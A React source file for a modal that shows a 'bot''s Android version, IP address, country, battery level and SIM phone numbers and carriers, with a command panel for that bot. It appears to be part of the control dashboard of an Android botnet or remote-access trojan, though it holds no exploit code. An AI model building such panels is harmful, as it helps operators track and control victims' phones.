import React from "react";
import {BotModalProps} from "../../../Model/Modal";
import {Button, Divider, Modal, Space} from "antd";
import {AndroidOutlined} from "@ant-design/icons";
import {BatteryIcon} from "../../Misc/CustomIcons";
import {useTranslation} from "react-i18next";
import BotCommands from "../../Misc/BotCommands";

const BotInfo: React.FC<BotModalProps> = (props: BotModalProps) => {
    const bot = props.bot;

    const closeModal = () => {
        props.setVisible(false);
    };

    const {t} = useTranslation();

    return (
        <Modal
            open={props.visible}
            onCancel={closeModal}
            title={t("BOT_INFO")}
            width={630}
            className="botinfo-modal"
            destroyOnClose
            footer={[
                <Button type="primary" onClick={closeModal} key={1}>
                    {t("MODAL_BUTTON_CANCEL")}
                </Button>,
            ]}
        >
            <div className="botinfo-list">
                <Divider orientation="center" style={{marginBottom: 10}}>
                    {t("COMMON_INFORMATION")}
                </Divider>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>{t("OPERATION_SYSTEM")}</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <AndroidOutlined style={{color: "#4aac16"}} /> Android {bot.metadata.android}
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>IP:</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <div><i className="fa-solid fa-network-wired" style={{fontSize: 13}} /> {bot.ip}</div>
                        <Space size={5}>
                            <img
                                src={`https://purecatamphetamine.github.io/country-flag-icons/3x2/${bot.country_code.toUpperCase()}.svg`}
                                alt={bot.country}
                                width={16}
                            />
                            <span>{bot.country}</span>
                        </Space>
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>{t("BATTERY_LEVEL")}</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <BatteryIcon/> {bot.sub_info.batteryLevel}%
                    </span>
                </div>
            </div>

            <div className="botinfo-info">
                <Divider orientation="center" style={{marginBottom: 10}}>
                    {t("SIM_CARDS")}
                </Divider>

                <table className="botinfo-table">
                    <thead>
                        <tr>
                            <th>
                                <i className="fa-solid fa-sim-card" /> <span style={{fontSize: 20}}>{t("SIM_CARD")} #1</span>
                            </th>
                            <th className={!bot.sim_data?.isDualSim ? "disabled" : ""}>
                                <i className="fa-solid fa-sim-card" /> <span style={{fontSize: 20}}>{t("SIM_CARD")} #2</span>
                            </th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>
                                {bot.sim_data?.phone_number && (
                                    <div className="botinfo-tel">
                                        <i className="fa-solid fa-square-phone"/>
                                        <span>{bot.sim_data?.phone_number}</span>
                                    </div>
                                )}
                                {bot.sim_data?.operator && (
                                    <div className="botinfo-provider">
                                        <i className="fa-solid fa-tower-cell"/> <span>{bot.sim_data.operator}</span>
                                    </div>
                                )}
                            </td>
                            {bot.sim_data?.isDualSim ? (
                                <td>
                                    {bot.sim_data?.phone_number1 && (
                                        <div className="botinfo-tel">
                                            <i className="fa-solid fa-square-phone"/>
                                            <span>{bot.sim_data.phone_number1}</span>
                                        </div>
                                    )}
                                    {bot.sim_data?.operator1 && (
                                        <div className="botinfo-provider">
                                            <i className="fa-solid fa-tower-cell"/>
                                            <span>{bot.sim_data.operator1}</span>
                                        </div>
                                    )}
                                </td>
                            ) : (
                                <td style={{color: "rgba(140, 140, 140, .5)"}}>
                                    <i className="fa-solid fa-circle-xmark" /> {t("SIM_NOT_PLUGGED")}
                                </td>
                            )}
                        </tr>
                    </tbody>
                </table>
            </div>

            <BotCommands botId={props.bot.id} load={props.visible}/>
        </Modal>
    );
};

export default BotInfo;
